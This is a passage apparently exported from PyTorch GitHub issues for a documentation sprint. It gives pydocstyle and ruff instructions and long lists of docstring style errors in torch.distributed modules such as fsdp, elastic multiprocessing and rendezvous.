- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')

cc @carljparker",False
"Fix docstring errors in etcd_server.py, etcd_rendezvous.py, api.py, __init__.py, error_handler.py, dynamic_rendezvous.py, tail_log.py, etcd_rendezvous_backend.py, redirects.py, c10d_rendezvous_backend.py, utils.py, registry.py, etcd_store.py, static_tcp_rendezvous.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/events/__init__.py`, **Entity**: `_get_or_create_logger`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/events/__init__.py`, **Entity**: `_get_or_create_logger`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `EventSource`, **Line**: 20, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `Event`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `Event`, **Line**: 30, **Description**: First line should end with a period (not 'c')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `NodeState`, **Line**: 63, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/metrics/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 'I')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `prof`, **Line**: 103, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `prof`, **Line**: 103, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `put_metric`, **Line**: 183, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `put_metric`, **Line**: 183, **Description**: First line should be in imperative mood (perhaps 'Publish', not 'Publishes')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `get_elapsed_time_ms`, **Line**: 206, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `get_elapsed_time_ms`, **Line**: 206, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SignalException`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SignalException`, **Line**: 42, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_get_kill_signal`, **Line**: 66, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_get_default_signal`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `from_str`, **Line**: 108, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `from_str`, **Line**: 108, **Description**: First line should be in imperative mood; try rephrasing (found 'Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `RunProcsResult`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `PContext`, **Line**: 190, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `PContext`, **Line**: 190, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `start`, **Line**: 231, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_start`, **Line**: 245, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_poll`, **Line**: 252, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_poll`, **Line**: 252, **Description**: First line should be in imperative mood (perhaps 'Poll', not 'Polls')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_close`, **Line**: 311, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_close`, **Line**: 311, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `close`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `close`, **Line**: 320, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `MultiprocessContext`, **Line**: 376, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessHandler`, **Line**: 555, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessHandler`, **Line**: 555, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessContext`, **Line**: 599, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/tail_log.py`, **Entity**: `TailLog`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/tail_log.py`, **Entity**: `TailLog`, **Line**: 48, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ProcessFailure`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ProcessFailure`, **Line**: 83, **Description**: First line should end with a period (not ',')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `ErrorHandler`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `ErrorHandler`, **Line**: 23, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `initialize`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `initialize`, **Line**: 42, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_write_error_file`, **Line**: 54, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_write_error_file`, **Line**: 54, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `override_error_code_in_rootcause_data`, **Line**: 90, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `dump_error_file`, **Line**: 109, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `dump_error_file`, **Line**: 109, **Description**: First line should be in imperative mood (perhaps 'Dump', not 'Dumps')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `EtcdStore`, **Line**: 27, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `EtcdStore`, **Line**: 27, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `set`, **Line**: 51, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `add`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `add`, **Line**: 80, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `wait`, **Line**: 117, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `check`, **Line**: 130, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/__init__.py`, **Entity**: ``, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/__init__.py`, **Entity**: ``, **Line**: 7, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/registry.py`, **Entity**: `get_rendezvous_handler`, **Line**: 49, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/registry.py`, **Entity**: `get_rendezvous_handler`, **Line**: 49, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `get_state`, **Line**: 61, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `set_state`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `sync`, **Line**: 322, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `mark_dirty`, **Line**: 331, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `run`, **Line**: 540, **Description**: First line should be in imperative mood (perhaps 'Execute', not 'Executes')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `_should_keep_alive`, **Line**: 771, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `from_backend`, **Line**: 904, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvousHandler`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvousHandler`, **Line**: 78, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvous`, **Line**: 198, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvous`, **Line**: 198, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `rendezvous_barrier`, **Line**: 260, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `rendezvous_barrier`, **Line**: 260, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `init_phase`, **Line**: 317, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `init_phase`, **Line**: 317, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initially')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: First line should end with a period (not ',')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_peers`, **Line**: 549, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_peers`, **Line**: 549, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: 1 blank line required between summary line and description (found 0)
